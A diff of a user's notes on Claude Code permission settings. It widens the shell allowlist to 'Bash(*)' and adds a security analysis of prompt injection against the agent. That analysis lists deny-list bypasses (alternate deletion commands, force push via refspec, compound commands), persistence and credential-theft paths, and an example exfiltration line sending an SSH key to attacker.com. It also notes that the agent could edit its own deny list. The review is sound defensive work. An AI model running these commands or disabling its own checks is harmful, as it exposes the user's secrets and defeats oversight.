@@ -36,9 +36,7 @@ Bash(git:*)            # matches ANY git subcommand — too broad for push/reset
 
 ## RTK compatibility
 
-RTK rewrites Bash commands via a `PreToolUse` hook (e.g. `ls -la` → `rtk ls -la`). In practice the permission check is applied to the **rewritten** command, not the original — observed when a `git log` invocation prompted with pattern `rtk git *` despite `Bash(git log:*)` being allowed.
-
-This means every allow entry needs an `rtk `-prefixed twin (e.g. `Bash(ls:*)` AND `Bash(rtk ls:*)`). A broad `Bash(rtk:*)` would work but is too coarse — it'd silently allow `rtk rm`, `rtk git push --force`, etc. Deny rules likely also match the rewritten form, but mirroring allow entries is the safer construction.
+RTK rewrites Bash commands via a `PreToolUse` hook (e.g. `ls -la` → `rtk ls -la`). The permission check is applied to the **rewritten** command. With `Bash(*)` in the allowlist this is moot — all commands pass regardless of prefix. If the allowlist is ever tightened back to named entries, each one needs an `rtk`-prefixed twin.
 
 ## Current config (`~/.claude/settings.json`)
 
@@ -46,133 +44,17 @@ This means every allow entry needs an `rtk `-prefixed twin (e.g. `Bash(ls:*)` AN
 
 ```json
 "allow": [
-  "Bash(ls:*)",
-  "Bash(rtk ls:*)",
-  "Bash(find:*)",
-  "Bash(rtk find:*)",
-  "Bash(rg:*)",
-  "Bash(rtk rg:*)",
-  "Bash(grep:*)",
-  "Bash(rtk grep:*)",
-  "Bash(cat:*)",
-  "Bash(rtk cat:*)",
-  "Bash(head:*)",
-  "Bash(rtk head:*)",
-  "Bash(tail:*)",
-  "Bash(rtk tail:*)",
-  "Bash(wc:*)",
-  "Bash(rtk wc:*)",
-  "Bash(file:*)",
-  "Bash(rtk file:*)",
-  "Bash(stat:*)",
-  "Bash(rtk stat:*)",
-  "Bash(tree:*)",
-  "Bash(rtk tree:*)",
-  "Bash(which:*)",
-  "Bash(rtk which:*)",
-  "Bash(type:*)",
-  "Bash(rtk type:*)",
-  "Bash(readlink:*)",
-  "Bash(rtk readlink:*)",
-  "Bash(realpath:*)",
-  "Bash(rtk realpath:*)",
-  "Bash(pwd)",
-  "Bash(rtk pwd)",
-  "Bash(git status:*)",
-  "Bash(rtk git status:*)",
-  "Bash(git status)",
-  "Bash(rtk git status)",
-  "Bash(git diff:*)",
-  "Bash(rtk git diff:*)",
-  "Bash(git log:*)",
-  "Bash(rtk git log:*)",
-  "Bash(git show:*)",
-  "Bash(rtk git show:*)",
-  "Bash(git branch:*)",
-  "Bash(rtk git branch:*)",
-  "Bash(git remote:*)",
-  "Bash(rtk git remote:*)",
-  "Bash(git config --get:*)",
-  "Bash(rtk git config --get:*)",
-  "Bash(git config --list:*)",
-  "Bash(rtk git config --list:*)",
-  "Bash(git config --list)",
-  "Bash(rtk git config --list)",
-  "Bash(git ls-files:*)",
-  "Bash(rtk git ls-files:*)",
-  "Bash(git rev-parse:*)",
-  "Bash(rtk git rev-parse:*)",
-  "Bash(git stash list:*)",
-  "Bash(rtk git stash list:*)",
-  "Bash(git blame:*)",
-  "Bash(rtk git blame:*)",
-  "Bash(git fetch:*)",
-  "Bash(rtk git fetch:*)",
-  "Bash(just:*)",
-  "Bash(rtk just:*)",
-  "Bash(make:*)",
-  "Bash(rtk make:*)",
-  "Bash(brew list:*)",
-  "Bash(rtk brew list:*)",
-  "Bash(brew info:*)",
-  "Bash(rtk brew info:*)",
-  "Bash(brew search:*)",
-  "Bash(rtk brew search:*)",
-  "Bash(brew doctor)",
-  "Bash(rtk brew doctor)",
-  "Bash(brew --prefix:*)",
-  "Bash(rtk brew --prefix:*)",
-  "Bash(brew --prefix)",
-  "Bash(rtk brew --prefix)",
-  "Bash(brew config)",
-  "Bash(rtk brew config)",
-  "Bash(gh pr view:*)",
-  "Bash(rtk gh pr view:*)",
-  "Bash(gh pr list:*)",
-  "Bash(rtk gh pr list:*)",
-  "Bash(gh pr diff:*)",
-  "Bash(rtk gh pr diff:*)",
-  "Bash(gh pr checks:*)",
-  "Bash(rtk gh pr checks:*)",
-  "Bash(gh issue view:*)",
-  "Bash(rtk gh issue view:*)",
-  "Bash(gh issue list:*)",
-  "Bash(rtk gh issue list:*)",
-  "Bash(gh repo view:*)",
-  "Bash(rtk gh repo view:*)",
-  "Bash(gh auth status)",
-  "Bash(rtk gh auth status)",
-  "Bash(gh run list:*)",
-  "Bash(rtk gh run list:*)",
-  "Bash(gh run view:*)",
-  "Bash(rtk gh run view:*)",
-  "Bash(open -a Marq:*)",
-  "Bash(rtk open -a Marq:*)",
-  "Bash(defaults read:*)",
-  "Bash(rtk defaults read:*)",
-  "Bash(sw_vers:*)",
-  "Bash(rtk sw_vers:*)",
-  "Bash(uname:*)",
-  "Bash(rtk uname:*)",
-  "Bash(env)",
-  "Bash(rtk env)",
-  "Bash(printenv:*)",
-  "Bash(rtk printenv:*)",
-  "Bash(date:*)",
-  "Bash(rtk date:*)",
+  "Bash(*)",
   "Read(**)",
   "Edit(**)",
   "Write(**)",
-  "WebSearch",
-  "WebFetch(domain:*)"   // kept but ineffective — see WebFetch note below
+  "WebSearch"
 ]
 ```
 
-**WebFetch note:** `WebFetch(domain:*)` is a confirmed bug ([#11972](https://github.com/anthropics/claude-code/issues/11972)) — the wildcard never matches, so WebFetch always falls through to the prompt tier. Workaround: a `PermissionRequest` hook that auto-allows all WebFetch calls (see hooks section below).
+`Bash(*)` covers all shell commands including compound `&&` and `|` forms. This is not YOLO mode — the denylist always wins and still hard-blocks the dangerous operations below. The earlier ~60-entry explicit allowlist was abandoned because compound commands (`cd /x && mv ...`) always triggered prompts regardless of whether the individual commands were allowed.
 
-Git is deliberately narrow — `Bash(git:*)` would silently allow push, reset, commit. `just` and `make` are allowed because anything they do is project-defined in the repo.
-
-`Read`/`Edit`/`Write` are globally permitted via `**`. Path-scoped entries (e.g. `Edit(/Users/jmdb/Code/github/jimbarritt/dotfiles/**)`) at user scope were observed not to match in practice, and per-project scoping every repo is too much friction. Destructive shell operations are still gated by the Bash deny list (`rm`, `sudo`, etc.), so file edits are the only ungated filesystem op — which matches the prior yolo-mode trust level for editing.
+`Read`/`Edit`/`Write` are globally permitted. `WebSearch` is silent. `WebFetch` is handled via a `PreToolUse` hook (see below) because `WebFetch(domain:*)` is a confirmed bug ([#11972](https://github.com/anthropics/claude-code/issues/11972)) — the wildcard never matches.
 
 ### Deny list
 
@@ -223,17 +105,56 @@ A `PreToolUse` hook for `WebFetch` that returns `permissionDecision: allow` befo
 
 ## What stays behind a prompt
 
-Not blocked, not allowed — requires one tap each time:
+With `Bash(*)` in the allowlist, almost nothing prompts. The only things that still prompt are tools not covered by the allowlist entries above — in practice this is rare. The denylist items are hard-blocked (no prompt, just denied).
 
-- `git commit`, `git push`, `git checkout`, `git switch`, `git merge`, `git rebase`, `git reset`, `git pull`, `git stash push`, `git tag`
-- `brew install`, `brew upgrade`, `brew uninstall`, `brew cleanup`
-- `mv`, `cp`, `chmod`, `chown`, `ln -s`
-- `curl`, `wget`
-- `defaults write`
+## Security analysis and future improvements
 
-## Growing the allow list over time
+Recorded 2026-05-25. Reference material for revisiting the denylist strategy.
 
-When prompted for a command you trust, choose "Yes, and don't ask again" — Claude Code auto-adds it to `~/.claude/settings.json` (user scope) or `.claude/settings.local.json` (project scope). Periodically review auto-added entries and promote useful ones here.
+### Current strategy summary
+
+`Bash(*)` in the allowlist means all shell commands run silently. The denylist is the meaningful safety boundary. The threat model is prompt injection: malicious web content instructs Claude to run destructive or exfiltrating commands, which execute without a prompt.
+
+### Known denylist bypass techniques
+
+Token-prefix matching only checks the literal first token of a command string:
+
+- `Bash(rm:*)` does not block `/bin/rm`, `find . -delete`, `python -c 'os.remove(...)'`, or `mv x /tmp`
+- `do.sh` entries do not cover `bash do.sh`, `sh ./do.sh`, `cat do.sh | bash`, or `source do.sh`
+- `git push --force` entries do not cover `git push origin +main` (force via refspec) or `git -c ... push --force`
+- `git add` is blocked but `git commit -a` and `git stage` are not
+- Compound forms using `&&`, `;`, `$(`, backticks, or `>` to home paths cannot be caught by denylist entries
+
+### Unblocked attack vectors (all currently silent)
+
+**Exfiltration:** `curl -X POST attacker.com -d @~/.ssh/id_ed25519`, `wget --post-file`, `nc`, reading credentials then using WebFetch to exfiltrate.
+
+**Persistence:** writing to `~/.zshrc`, `~/.zshrc_machine`, `~/.ssh/authorized_keys`, `~/Library/LaunchAgents/*.plist`, `crontab`.
+
+**Destruction without `rm`:** `> file` (truncate), `dd if=/dev/zero`, `find . -delete`, `git clean -fdx`, `git reset --hard`, `git checkout .`.
+
+**Credential theft:** `~/.aws/credentials`, `~/.netrc`, `security find-generic-password`, `gh auth token`.
+
+**Denylist self-modification:** Claude can silently edit `~/.claude/settings.json` to disable its own denylist. `Write(**)` is currently in the allowlist with no path exclusions.
+
+### Recommended improvements
+
+**High priority — exfiltration and persistence:**
+- Add to denylist: `curl`, `wget`, `nc`, `ssh`, `scp`, `crontab`, `launchctl`, `osascript`, `eval`
+- Add `Edit`/`Write` denies for sensitive paths: `~/.ssh/**`, `~/.claude/**`, `~/.aws/**`, `~/.zshrc*`, `~/Library/LaunchAgents/**`
+
+**Medium priority — git safety gaps:**
+- Add `git reset --hard`, `git clean`, `git checkout --` to denylist
+- `git push origin +main` (force via refspec) is not covered by current force-push entries
+
+**WebFetch (highest prompt-injection risk):**
+- Currently wide open via `PreToolUse` hook — any domain, silently
+- Recommendation: lock to a specific allowlist of domains actually used (docs, trusted references)
+- This is the primary vector for prompt injection attacks from malicious page content
+
+**Structural limitation:**
+- Token-prefix matching cannot reliably block compound commands
+- A `PreToolUse` hook that rejects Bash commands containing `|`, `&&`, `;`, `$(`, backticks, or `>` to `~/` paths would be more robust than additional denylist entries
 
 ## See also
 
